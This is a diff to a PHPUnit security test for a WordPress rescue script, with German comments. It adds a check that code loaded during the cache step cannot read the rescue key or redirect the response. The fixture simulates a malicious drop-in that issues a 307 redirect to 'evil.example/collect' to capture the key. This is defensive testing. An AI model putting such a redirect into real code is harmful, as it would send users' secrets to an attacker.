@@ -21,6 +21,8 @@ final class RescueScriptTest extends TestCase
     private string $content;
     private string $work;
     private string $key;
+    /** Kopfzeilen der letzten Antwort; null, wo sie sich nicht lesen lassen (ohne php-cgi). */
+    private ?string $headers = null;
 
     protected function setUp(): void
     {
@@ -91,7 +93,8 @@ final class RescueScriptTest extends TestCase
             $out = (string) stream_get_contents($pipes[1]);
             stream_get_contents($pipes[2]);
             proc_close($process);
-            $parts  = explode("\r\n\r\n", $out, 2);
+            $parts         = explode("\r\n\r\n", $out, 2);
+            $this->headers = $parts[0];
             $status = preg_match('/^Status: (\d{3})/mi', $parts[0], $m) === 1 ? (int) $m[1] : 200;
             $this->assertStringContainsString('Content-type: application/json', strtr($parts[0], ['Content-Type' => 'Content-type']));
             return [$status, $parts[1] ?? ''];
@@ -191,6 +194,46 @@ PHP);
         unlink($this->root . '/loaded.txt');
         $this->assertSame([409, '{"ok":false,"error":"nothing to flush"}'], $this->request($this->post('cache')));
         $this->assertFileDoesNotExist($this->root . '/loaded.txt');
+    }
+
+    /**
+     * Security-Review P3, N6: was der Cache-Schritt lädt (wp-config.php, Drop-ins), sieht den
+     * Rescue-Key nicht in $_POST oder $_REQUEST – und kann die Antwort nicht in eine Umleitung
+     * verwandeln, der ein Client mit dem Schlüssel im Body folgen könnte.
+     */
+    public function testWhatTheCacheStepLoadsSeesNoKeyAndCannotRedirect(): void
+    {
+        $this->stale();
+        $this->wordpress(<<<'PHP'
+file_put_contents(__DIR__ . '/seen.txt', json_encode([$_POST['key'] ?? null, $_REQUEST['key'] ?? null, $_POST['push_id'] ?? null]));
+header('Location: https://evil.example/collect', true, 307);
+header('X-Redirect-By: drop-in');
+function wp_cache_flush() { return true; }
+PHP);
+        $this->assertSame([200, '{"ok":true,"cache":"flushed"}'], $this->request($this->post('cache')));
+        $this->assertSame('[null,null,"' . self::ID . '"]', file_get_contents($this->root . '/seen.txt'));
+        if ($this->headers !== null) {
+            $this->assertStringNotContainsStringIgnoringCase('location:', $this->headers);
+            $this->assertStringNotContainsString('evil.example', $this->headers);
+        }
+
+        // Dasselbe, wenn WordPress den Request mit der Umleitung selbst beendet.
+        $this->stale();
+        unlink($this->root . '/seen.txt');
+        $this->wordpress(<<<'PHP'
+file_put_contents(__DIR__ . '/seen.txt', json_encode([$_POST['key'] ?? null, $_REQUEST['key'] ?? null, $_POST['push_id'] ?? null]));
+header('Location: https://evil.example/collect', true, 307);
+exit;
+PHP);
+        list($status, $body) = $this->request($this->post('cache'));
+        $this->assertSame('{"ok":false,"error":"cache failed"}', $body);
+        $this->assertSame('[null,null,"' . self::ID . '"]', file_get_contents($this->root . '/seen.txt'));
+        if ($status !== null) {
+            $this->assertSame(500, $status);
+        }
+        if ($this->headers !== null) {
+            $this->assertStringNotContainsStringIgnoringCase('location:', $this->headers);
+        }
     }
 
     /** Vor der Schlüsselprüfung und ohne „stale“ wird WordPress nie geladen. */
